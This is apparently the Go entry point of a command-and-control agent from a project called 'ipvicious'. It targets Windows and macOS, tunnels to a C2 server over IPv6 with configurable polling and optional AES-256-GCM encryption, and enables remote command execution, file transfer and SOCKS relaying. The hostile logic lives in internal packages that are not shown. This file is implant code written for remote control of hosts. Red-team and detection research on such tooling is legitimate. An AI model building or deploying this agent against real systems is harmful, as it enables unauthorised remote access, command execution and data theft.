//go:build windows || darwin

// cmd/client is the agent entry point (Windows amd64 and macOS arm64/amd64).
//
// Compile-time defaults (override with ldflags):
//
//	go build -ldflags "-X main.defaultC2=2001:db8::1 -X main.defaultPollMs=50"
//
// Runtime flags:
//
//	agent -c2 2001:db8::1 -poll 50
package main

import (
	"flag"
	"log"
	"net"
	"os"
	"os/signal"
	"strconv"
	"syscall"

	"ipvicious/internal/agent"
	"ipvicious/internal/tunnel"
)

// Compile-time defaults; overridable at link time.
var defaultC2 = "::1"
var defaultPollMs = "50"
var defaultPSK = "" // empty = no encryption

func main() {
	c2Flag := flag.String("c2", defaultC2, "C2 IPv6 address")
	pollFlag := flag.Int("poll", mustAtoi(defaultPollMs), "poll interval ms")
	pskFlag := flag.String("psk", defaultPSK, "pre-shared key for AES-256-GCM encryption (empty = disabled)")
	flag.Parse()

	c2IP := net.ParseIP(*c2Flag)
	if c2IP == nil {
		log.Fatalf("invalid C2 address: %s", *c2Flag)
	}
	pollMs := uint32(*pollFlag)
	if pollMs < 10 {
		pollMs = 10
	}
	if pollMs > 5000 {
		pollMs = 5000
	}

	tun, err := tunnel.NewClientTunnel(c2IP, pollMs)
	if err != nil {
		log.Fatalf("tunnel init: %v", err)
	}
	defer tun.Close()

	if *pskFlag != "" {
		if err := tun.SetPSK(*pskFlag); err != nil {
			log.Fatalf("psk: %v", err)
		}
		log.Printf("encryption: AES-256-GCM enabled")
	}

	// Wire agent callbacks (cmd exec, file transfer, SOCKS relay).
	agent.New(tun)

	stop := make(chan struct{})
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sig; close(stop) }()

	log.Printf("agent started -> %s (poll %dms)", c2IP, pollMs)
	tun.Run(stop)
	log.Printf("agent stopped")
}

func mustAtoi(s string) int {
	v, err := strconv.Atoi(s)
	if err != nil {
		panic("invalid default: " + s)
	}
	return v
}
